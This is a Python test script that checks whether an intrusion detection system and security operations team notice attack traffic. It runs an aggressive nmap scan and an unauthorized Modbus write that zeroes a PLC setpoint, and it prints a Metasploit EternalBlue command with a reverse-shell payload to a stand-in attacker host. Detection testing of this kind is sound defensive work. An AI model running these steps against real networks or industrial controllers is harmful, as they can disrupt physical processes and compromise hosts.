#!/usr/bin/env python3
"""
IDS Detection Test: Security Monitoring Validation
Tests whether network security controls detect malicious activity
Documents findings for security assessment report
"""

import json
import os
import time
from datetime import datetime
from pathlib import Path

import nmap


def test_port_scan_detection(target_network):
    """
    Perform obvious port scan that should trigger IDS
    Tests if network scanning is detected and alerted
    """

    print("=" * 70)
    print("[*] IDS Detection Test: Port Scanning")
    print("=" * 70)
    print(f"[*] Target: {target_network}")
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("[*] Expected IDS signature: SCAN NMAP TCP")
    print("[*] Expected severity: MEDIUM to HIGH")

    start_time = datetime.now()

    try:
        nm = nmap.PortScanner()

        # Aggressive scan (should definitely be detected)
        print("\n[*] Performing aggressive TCP SYN scan...")
        print("    Scan type: TCP SYN (-sS)")
        print("    Timing: Aggressive (-T4)")
        print("    Ports: 1-1000")
        print("    This is deliberately NOISY to test detection\n")

        nm.scan(target_network, "1-1000", arguments="-sS -T4 -v")

        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()

        print(f"[*] Scan complete in {duration:.1f} seconds")
        print(f"[*] Hosts scanned: {len(nm.all_hosts())}")

        # Display found hosts and services
        print("\n[*] Discovered hosts:")
        for host in nm.all_hosts():
            print(f"    {host} - {nm[host].state()}")
            if "tcp" in nm[host]:
                open_ports = [
                    port
                    for port in nm[host]["tcp"].keys()
                    if nm[host]["tcp"][port]["state"] == "open"
                ]
                if open_ports:
                    print(f"        Open ports: {', '.join(map(str, open_ports[:10]))}")

    except Exception as e:
        print(f"[!] Scan error: {e}")
        print(
            "[!] Note: This requires nmap to be installed and may require root privileges"
        )
        end_time = datetime.now()
        duration = 0

    print("\n[*] EXPECTED DETECTION:")
    print("    ✓ IDS should log scan activity")
    print("    ✓ Alert should be generated")
    print("    ✓ Email/ticket to security team")
    print("    ✓ SIEM correlation of scan events")

    print("\n[*] VERIFICATION CHECKLIST:")
    print(f"    1. Check IDS logs at {start_time.strftime('%H:%M:%S')}")
    print("    2. Check security mailbox (security@uupl.edu)")
    print("    3. Check SIEM for correlated events")
    print("    4. Interview SOC: Did they see this scan?")
    print("    5. Interview SOC: Did they investigate?")
    print("    6. Interview SOC: What was their response time?")

    return {
        "test_type": "port_scan",
        "start_time": start_time.isoformat(),
        "end_time": end_time.isoformat(),
        "duration": duration,
        "target": target_network,
        "expected_signature": "SCAN NMAP TCP",
        "severity": "MEDIUM-HIGH",
    }


def test_modbus_anomaly_detection(target_ip):
    """
    Test detection of suspicious Modbus traffic
    """
    print("\n" + "=" * 70)
    print("[*] IDS Detection Test: Modbus Write Anomaly")
    print("=" * 70)
    print(f"[*] Target: {target_ip}")
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("[*] Expected detection: Unauthorized Modbus write")

    start_time = datetime.now()

    try:
        from pymodbus.client import ModbusTcpClient

        print("\n[*] Performing unauthorized Modbus write...")
        print("    Protocol: Modbus/TCP")
        print("    Function: Write Single Register (0x06)")
        print("    Action: Modify critical setpoint")

        client = ModbusTcpClient(target_ip, port=502)

        if client.connect():
            print("    [✓] Connected to PLC")

            # Write to critical register
            result = client.write_register(1000, 0)

            if not result.isError():
                print("    [✓] Write successful (setpoint modified)")
            else:
                print("    [!] Write failed")

            client.close()
        else:
            print("    [!] Connection failed (test requires running PLC)")

    except ImportError:
        print("    [!] pymodbus not installed, simulating test")
    except Exception as e:
        print(f"    [!] Error: {e}")

    end_time = datetime.now()

    print("\n[*] EXPECTED DETECTION:")
    print("    ✓ IDS signature: SCADA_IDS MODBUS Write to Holding Register")
    print("    ✓ Alert severity: HIGH")
    print("    ✓ Immediate SOC notification")
    print("    ✓ Possible automated blocking")

    print("\n[*] VERIFICATION CHECKLIST:")
    print(f"    1. Check IDS logs at {start_time.strftime('%H:%M:%S')}")
    print("    2. Verify Modbus-specific detection rules exist")
    print("    3. Check if OT traffic is monitored separately")
    print("    4. Interview SOC: Response to OT alerts vs IT alerts?")

    return {
        "test_type": "modbus_write",
        "start_time": start_time.isoformat(),
        "end_time": end_time.isoformat(),
        "target": target_ip,
        "expected_signature": "SCADA_IDS MODBUS Write",
        "severity": "HIGH",
    }


def test_exploit_detection(target_ip):
    """
    Document exploit detection test
    (Does not actually run exploits - for documentation only)
    """

    print("\n" + "=" * 70)
    print("[*] IDS Detection Test: Exploit Attempt (DOCUMENTATION)")
    print("=" * 70)
    print(f"[*] Target: {target_ip}")
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("[*] Expected detection: ET EXPLOIT Microsoft Windows SMB")

    test_time = datetime.now()

    print("\n[*] Example Metasploit command (DO NOT RUN without authorization):")
    print("""
    msfconsole
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOST {target_ip}
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST {attacker_ip}
    check  # Only check, don't exploit
    """)

    print("\n[*] EXPECTED DETECTION:")
    print("    ✓ IDS signature match on exploit traffic")
    print("    ✓ Severity: CRITICAL")
    print("    ✓ High-priority alert generated")
    print("    ✓ Immediate SOC response expected")
    print("    ✓ Possible automated IP blocking")

    print("\n[*] VERIFICATION CHECKLIST:")
    print("    1. Does IDS have exploit signatures enabled?")
    print("    2. Are Emerging Threats rules up to date?")
    print("    3. What is response time for CRITICAL alerts?")
    print("    4. Is there automated blocking for exploit attempts?")

    return {
        "test_type": "exploit_detection",
        "start_time": test_time.isoformat(),
        "target": target_ip,
        "expected_signature": "ET EXPLOIT",
        "severity": "CRITICAL",
        "note": "Documentation only - not executed",
    }


def generate_detection_report(test_results):
    """
    Generate comprehensive detection test report
    """

    # Ensure reports directory exists
    reports_dir = Path(__file__).parent.parent.parent / "reports"
    reports_dir.mkdir(exist_ok=True)

    report_file = (
        reports_dir
        / f'ids_detection_test_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    )

    report = {
        "report_date": datetime.now().isoformat(),
        "assessment_type": "IDS Detection Validation",
        "tests_performed": test_results,
        "verification_required": {
            "immediate": [
                "Check IDS console for test events",
                "Check security mailbox for alerts",
                "Verify SIEM received events",
            ],
            "interview_questions": [
                "Did SOC receive alerts for these tests?",
                "What was the response time?",
                "Were the alerts investigated?",
                "What actions were taken?",
                "Are OT networks monitored differently than IT?",
                "Are there dedicated OT security analysts?",
            ],
            "technical_checks": [
                "Review IDS rule set for OT-specific signatures",
                "Check if Modbus/DNP3/OPC UA protocols monitored",
                "Verify signature update frequency",
                "Test alert delivery mechanisms",
                "Review SOC runbooks for OT incidents",
            ],
        },
        "findings_template": {
            "detection_capability": "TO BE FILLED",
            "response_time": "TO BE FILLED",
            "investigation_quality": "TO BE FILLED",
            "gaps_identified": [],
            "recommendations": [],
        },
    }

    with open(report_file, "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n[*] Detection test report saved to: {report_file}")

    # Also create human-readable version
    txt_file = str(report_file).replace(".json", ".txt")
    with open(txt_file, "w") as f:
        f.write("IDS DETECTION VALIDATION TEST REPORT\n")
        f.write("=" * 70 + "\n\n")
        f.write(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("Assessment Type: IDS Detection Validation\n\n")

        f.write("TESTS PERFORMED:\n")
        f.write("-" * 70 + "\n")
        for i, test in enumerate(test_results, 1):
            f.write(f"\nTest {i}: {test['test_type']}\n")
            f.write(f"  Time: {test['start_time']}\n")
            f.write(f"  Target: {test.get('target', 'N/A')}\n")
            f.write(f"  Expected Signature: {test['expected_signature']}\n")
            f.write(f"  Severity: {test['severity']}\n")

        f.write("\n\nVERIFICATION REQUIRED:\n")
        f.write("-" * 70 + "\n")
        f.write("\nImmediate Checks:\n")
        for item in report["verification_required"]["immediate"]:
            f.write(f"  [ ] {item}\n")

        f.write("\nSOC Interview Questions:\n")
        for item in report["verification_required"]["interview_questions"]:
            f.write(f"  [ ] {item}\n")

        f.write("\nTechnical Verification:\n")
        for item in report["verification_required"]["technical_checks"]:
            f.write(f"  [ ] {item}\n")

        f.write("\n\nFINDINGS (TO BE COMPLETED):\n")
        f.write("-" * 70 + "\n")
        f.write("Detection Capability: _______________\n")
        f.write("Response Time: _______________\n")
        f.write("Investigation Quality: _______________\n")
        f.write("\nGaps Identified:\n")
        f.write("1. _______________\n")
        f.write("2. _______________\n")
        f.write("3. _______________\n")
        f.write("\nRecommendations:\n")
        f.write("1. _______________\n")
        f.write("2. _______________\n")
        f.write("3. _______________\n")

    print(f"[*] Human-readable checklist saved to: {txt_file}")

    return report_file


if __name__ == "__main__":
    print("=" * 70)
    print("[*] IDS Detection Validation Test Suite")
    print("[*] Purpose: Verify security monitoring effectiveness")
    print("=" * 70 + "\n")

    print("[!] WARNING: These tests generate security alerts")
    print("[!] Ensure you have authorization before proceeding")
    print("[!] Coordinate with SOC to expect test traffic\n")

    test_results = []

    # Test 1: Port Scanning
    result1 = test_port_scan_detection("192.168.10.0/24")
    test_results.append(result1)

    time.sleep(2)

    # Test 2: Modbus Anomaly
    result2 = test_modbus_anomaly_detection("192.168.10.10")
    test_results.append(result2)

    time.sleep(2)

    # Test 3: Exploit Detection (documentation)
    result3 = test_exploit_detection("192.168.10.10")
    test_results.append(result3)

    # Generate report
    print("\n" + "=" * 70)
    print("[*] Generating Detection Test Report")
    print("=" * 70)

    report_file = generate_detection_report(test_results)

    print("\n[*] NEXT STEPS:")
    print("    1. Wait 15-30 minutes for alerts to propagate")
    print("    2. Check IDS console/logs for test events")
    print("    3. Check security mailbox for alerts")
    print("    4. Interview SOC about detection and response")
    print("    5. Document findings in report files")
    print("    6. Include in final assessment report")

    print("\n[*] FILES CREATED:")
    print(f"    - {report_file} (structured data)")
    print(f"    - {report_file.replace('.json', '.txt')} (checklist)")

    print("\n" + "=" * 70)
